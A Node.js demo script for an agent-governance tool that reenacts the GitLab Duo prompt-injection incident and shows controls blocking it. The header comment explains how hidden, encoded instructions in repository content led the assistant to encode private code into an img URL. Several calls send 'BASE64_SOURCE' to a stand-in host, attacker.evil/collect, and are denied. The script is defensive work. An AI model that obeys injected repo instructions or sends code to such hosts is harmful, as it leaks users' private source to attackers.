#!/usr/bin/env node
// GitLab Duo prompt-injection source-code exfiltration (disclosed Feb 2025,
// published May 2025). Hidden instructions planted in repository content
// (merge requests, commits, issues, code) — concealed with Unicode smuggling,
// Base16 encoding, and white-text/KaTeX rendering — made the Claude-powered
// GitLab Duo assistant read private source code, Base64-encode it, and emit an
// HTML img tag whose URL pointed to an attacker-controlled server. When the
// victim's browser rendered the response the img tag fired a GET request that
// exfiltrated the code. GitLab's fix was an output allowlist: Duo may no longer
// render unsafe HTML (img/form) pointing to domains outside gitlab.com.
//
// The controls that stop it here:
//   * Rendering assistant output is path-scoped to gitlab.com — output that
//     references an external attacker domain is refused (limit_violation). This
//     is the enforcement analogue of GitLab's real output allowlist fix.
//   * The exfiltration skill (transmit code to an external endpoint) is granted
//     to no assistant role, so the injected instruction is refused by
//     deny-by-default (skill_not_granted).
//   * The exfiltration skill is published high-risk, so even the one role that
//     holds it cannot run it inline — it must go through a governed flow with a
//     preceding approval gate (high_risk_requires_gate). This is the entry's
//     approval_gate control: reading private code and emitting output bound for
//     an outside domain is a checker-gated step, never an autonomous one.
//
// Names are prefixed `gitlab-duo-` so this demo does not collide with the other
// incident demos sharing the server.
//
// Run: boot the server (`docker compose up`, or locally with
// MAKERCHECKER_AUTH_DISABLED=1), build the SDK, then:
//   node examples/gitlab-duo-prompt-injection-source-code-exfiltration/demo.mjs
import {
  connect,
  ensureSkill,
  ensureRole,
  ensureAgent,
  ensureGrant,
  governedTool,
  GovernanceDeniedError,
  printTrailAndVerify,
} from "../lib/scenario.mjs";

const client = connect();

// --- Configure MakerChecker for the scenario -------------------------------
const repoRead = await ensureSkill(client, "gitlab-duo-repo-read@1", {
  description: "Read repository content (code, MRs, issues) the user may access.",
});
const render = await ensureSkill(client, "gitlab-duo-render-output@1", {
  description: "Render assistant output; resource URLs must stay under gitlab.com.",
});
const exfil = await ensureSkill(client, "gitlab-duo-external-exfil@1", {
  riskTier: "high",
  description: "Transmit source code to an external endpoint (irreversible).",
});

// The Duo assistant reads repo content and renders responses, but every
// rendered resource URL is path-scoped to gitlab.com — the output allowlist.
// It holds NO exfiltration grant: sending code off-platform is not a capability
// this role has at all.
const duoRole = await ensureRole(client, "gitlab-duo-assistant-role", {
  description: "Claude-powered Duo assistant: reads repos, renders gitlab.com output.",
  limits: {
    skills: {
      "gitlab-duo-render-output@1": {
        pathScope: { field: "resourceUrl", prefix: "/gitlab.com" },
      },
    },
  },
});
// A designated egress role may transmit data off-platform, but that action is
// high-risk and is refused on the proxy — it only proceeds through a governed
// flow with an approval gate decided by a human, never inline by the assistant.
const egressRole = await ensureRole(client, "gitlab-duo-egress-role", {
  description: "Transmits data off-platform, only through a gated flow.",
});

await ensureGrant(client, duoRole, repoRead);
await ensureGrant(client, duoRole, render);
await ensureGrant(client, egressRole, exfil);
// gitlab-duo-external-exfil@1 is granted to no assistant role.

await ensureAgent(client, "gitlab-duo-assistant-bot", "gitlab-duo-assistant-role");
await ensureAgent(client, "gitlab-duo-egress-bot", "gitlab-duo-egress-role");

// --- Drive the governed agents through the proxy ---------------------------
const { session } = await client.proxy.openSession({ label: "gitlab-duo-prompt-injection" });
console.log(`proxy session ${session.id} opened\n`);

const readRepo = governedTool(client, session.id, "gitlab-duo-assistant-bot", "gitlab-duo-repo-read@1", async (i) => ({ read: i.path, bytes: 4096 }));
const renderOutput = governedTool(client, session.id, "gitlab-duo-assistant-bot", "gitlab-duo-render-output@1", async (i) => ({ rendered: true, resourceUrl: i.resourceUrl }));
const assistantExfil = governedTool(client, session.id, "gitlab-duo-assistant-bot", "gitlab-duo-external-exfil@1", async () => { throw new Error("unreachable: deny-by-default blocks this"); });
const egressExfil = governedTool(client, session.id, "gitlab-duo-egress-bot", "gitlab-duo-external-exfil@1", async () => { throw new Error("unreachable: high-risk is gated"); });

// 1. Duo reads private source code the user is entitled to — allowed.
console.log("duo reads private source:", JSON.stringify(await readRepo({ path: "/gitlab.com/acme/private-app/src/auth.rb" })));

// 2. Duo renders a normal answer whose resources sit under gitlab.com — allowed.
console.log("duo renders gitlab.com output:", JSON.stringify(await renderOutput({ resourceUrl: "/gitlab.com/acme/private-app/blob/main/README.md" })));

// 3. The injected instruction tells Duo to emit an <img> tag pointing at an
//    attacker domain (the exfiltration channel) — denied; the rendered resource
//    URL is scoped to gitlab.com, so external-domain output never renders. This
//    is the output allowlist that was GitLab's real fix.
try {
  await renderOutput({ resourceUrl: "/attacker.evil/collect?data=BASE64_SOURCE" });
} catch (err) {
  if (!(err instanceof GovernanceDeniedError)) throw err;
  console.log(`render external-domain img DENIED (${err.code}): ${err.reason}`);
}

// 4. The injection instead tells Duo to transmit the code off-platform directly
//    — denied by default; the assistant role holds no exfiltration grant, so the
//    injected instruction cannot reach any egress channel.
try {
  await assistantExfil({ destination: "https://attacker.evil/collect", payload: "BASE64_SOURCE" });
} catch (err) {
  if (!(err instanceof GovernanceDeniedError)) throw err;
  console.log(`assistant exfil DENIED (${err.code}): ${err.reason}`);
}

// 5. Even the designated egress role, which DOES hold the grant, cannot exfil
//    inline through the proxy: sending code off-platform is high-risk and must
//    run through a governed flow with a preceding human approval gate.
try {
  await egressExfil({ destination: "https://attacker.evil/collect", payload: "BASE64_SOURCE" });
} catch (err) {
  if (!(err instanceof GovernanceDeniedError)) throw err;
  console.log(`egress direct exfil DENIED (${err.code}): ${err.reason}`);
}

await client.proxy.closeSession(session.id);
await printTrailAndVerify(client, session.id);
